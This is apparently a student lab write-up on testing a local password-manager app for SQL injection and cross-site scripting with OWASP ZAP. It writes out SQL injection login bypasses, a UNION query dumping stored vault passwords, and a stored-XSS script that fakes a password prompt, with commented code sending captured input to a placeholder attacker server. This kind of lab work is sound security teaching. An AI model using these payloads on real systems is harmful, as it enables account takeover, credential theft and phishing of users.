# W7 | Injection & XSS Testing

## Introduction  
Web applications live and die by how they handle user input—and in this lab, you’ll discover what happens when that input isn’t properly validated.

We’ll test two of the most common web vulnerabilities:
- **SQL Injection** which targets the database layer by manipulating queries
- **Cross-Site Scripting (XSS)** which injects malicious scripts into web pages

Using **OWASP ZAP** we’ll scan the app to find vulnerabilities then manually craft input to exploit them—altering data, injecting scripts, demonstrating risks of insecure input handling.

We’ll:
- Use **ZAP** to identify injection vulnerabilities
- Perform real SQLi and XSS attacks on a test system
- Learn how to prevent them through validation and sanitization

By the end, we’ll understand why **input handling** is one of the most critical aspects of web security and how to defend against these attacks in the wild.

## Steps
1. Download ZAP, enable configurations in computer settings to open. 
2. Select “Automated Scan”, enter password manager url https://localhost to begin attack.
3. In the top menu set view to “Reponses” and “Alerts” and let system run for 10 minutes.
4. Once a high alert (red flag) “SQL Injection” vulnerability is found, study the report to see which type of SQL injection can be used for the username in the login page.
**Log in as Admin without using their password**
5. Use the query ' and 0 in (select sleep(15) ) – and random password to bypass the login page.
6. Explore pages, and logout.
7. Login as the Admin without a password using a similar approach. Admin’ --#
8. Logout, login as “Username” with proper credentials.

**Find a way to retrieve all VAULT passwords from database**
9. Navigate to Vaults page.
10. In the search field input the following injection: ‘UNION SELECT username, password FROM vault_passwords-- -
11. Press enter to see all vault passwords load.

**Create false pop-up asking victim for confidential info whenever they access a vault**
12. Reload page to clear the search field.
13. Navigate to a vault, click on “Edit password”.
14. In the “Notes” field paste the JS payload that will create a fake popup asking for sensitive information.
<script>
    var phishing_prompt = prompt("Security Alert: For your protection, please re-enter your VAULT password.");
    if (phishing_prompt) {
        // In a real scenario, you would send 'phishing_prompt' to an attacker-controlled server.
        // For demonstration, we'll just show an alert with the entered data.
        alert("Captured data (for demo): " + phishing_prompt + "\n(In a real attack, this would be sent to the attacker.)");

        // To send it to an attacker server (similar to Task 2):
        // var attacker_server_url = 'https://YOUR_ATTACKER_SERVER_URL/log_phish'; 
        // new Image().src = attacker_server_url + '?phished_data=' + encodeURIComponent(phishing_prompt);
    }
</script>
15. Click “Update Password” to save and have a partner navigate to the vault to edit details. 
16. Tne JS embedded in the “Notes” field will popup automatically, asking for their vault password. 
17. If they enter information an alert box will show the captured data.
<img width="80%" alt="image" src="https://github.com/user-attachments/assets/2b061cdf-d198-415e-a295-abf95a67a42b" />

*Retrieving all Vault passwords with SQLi*

<img width="80%" alt="image" src="https://github.com/user-attachments/assets/245ba557-bca0-4a70-a03c-d3c54cc1cb49" />

*Malicious payload and popup asking user for crential information*
## Reflection


<img width="50%" alt="image" src="https://github.com/user-attachments/assets/3f0ebd2c-271e-4eb8-b2e7-468f639a6d06" />

